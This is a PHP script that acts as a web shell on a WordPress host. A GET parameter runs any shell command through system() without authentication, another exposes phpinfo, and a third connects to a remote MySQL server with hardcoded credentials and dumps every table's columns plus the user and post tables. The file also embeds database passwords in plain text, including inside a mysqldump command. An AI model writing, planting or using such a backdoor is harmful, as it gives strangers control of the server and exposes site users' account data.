<?php
$servername = 'localhost';
$username = 'sjmr';
$password = 'passw0rd';
$database = 'wordpress_duplicate';

function dump() {
$command='mysqldump -h eeeeeepcom.ipagemysql.com -uyQj3446hI378ylE -p0ptsIN0ZbQWgcq2N wordpress_c3hck4bimm > zzzz.sql';
}
function runcommand($command)
{
    echo '<pre>';
    echo $command;
    echo '
';
    $last_line = system($command . ' 2>&1', $retval);
echo '
Return value: ' . $retval . '
</pre>
<hr/>
';
}
function showcolumns($dbh, $tablename) {
echo '<pre>======= show columns '.$tablename.'========</pre>';
$rows = $dbh->query('SHOW COLUMNS FROM '.$tablename)->fetch_all();
echo '<pre>n: '.count($rows).'</pre>';
$n=count($rows);
for($i=0;$i<$n;$i++) {
// echo '<pre>i:  '.$i.'</pre>';
// echo '<pre>row:  '.count($rows[$i]).'</pre>';
$m=count($rows[$i]);
$row='';
$prefix='';
for($j=0;$j<$m;$j++) {
$row=$row.$prefix.$rows[$i][$j];
$prefix=',';
}
echo '<pre>'.$row.'</pre>';
}
}
function showtable($dbh, $tablename) {
echo '<pre>======= select * '.$tablename.'========</pre>';
$query='select * FROM '.$tablename;
$rows = $dbh->query('select * FROM '.$tablename)->fetch_all();
$n=count($rows);
for($i=0;$i<$n;$i++) {
// echo '<pre>i:  '.$i.'</pre>';
// echo '<pre>row:  '.count($rows[$i]).'</pre>';
$m=count($rows[$i]);
$row='';
$prefix='';
for($j=0;$j<$m;$j++) {
$row=$row.$prefix.$rows[$i][$j];
$prefix=',';
}
echo '<pre>'.$row.'</pre>';
}
echo '<pre>======= select * '.$tablename.'========</pre>';
}
// echo '<pre>';
$action = $_GET["action"];
if ($action == 'shell') {
    $command = $_GET["command"];
    // echo 'command:' . $command . '
// ';
    // echo 'command:' . strlen($command) . '
// ';
    // echo '</pre>';
    runcommand($command);
}
if($action=='phpinfo') {
    phpinfo();
}
if($action=='mysql') {
define('DB_NAME', 'wordpress_c3hck4bimm');

/** MySQL database username */
define('DB_USER', 'yQj3446hI378ylE');

/** MySQL database password */
define('DB_PASSWORD', '0ptsIN0ZbQWgcq2N');

/** MySQL hostname */
define('DB_HOST', 'eeeeeepcom.ipagemysql.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

	$dbh=mysqli_init();
if($dbh==false) {
echo '<pre>mysql_init failed</pre>';
}
else {
$port =null;
	$socket=null;
	$client_flags=0;
		if(mysqli_real_connect( $dbh, 'eeeeeepcom.ipagemysql.com', 'yQj3446hI378ylE', '0ptsIN0ZbQWgcq2N',  'wordpress_c3hck4bimm', $port, $socket, $client_flags )){
		echo '<pre>mysqli_real_connect succeeded</pre>';
$listdbtables = array_column($dbh->query('SHOW TABLES')->fetch_all(),0);
for($i=0;$i<count($listdbtables);$i++) {
echo '<pre>'.$listdbtables[$i].'</pre>';
showcolumns($dbh,$listdbtables[$i]);
}
showtable($dbh,'wp_jsdb_users');
showtable($dbh,'wp_jsdb_posts');


    echo '<pre>mysqli_init0</pre>';
	    	}
	    	else{
	    	echo '<pre>mysqli_real_connect failed</pre>';
	    	}
}
    echo '<pre>mysqli_init</pre>';
}
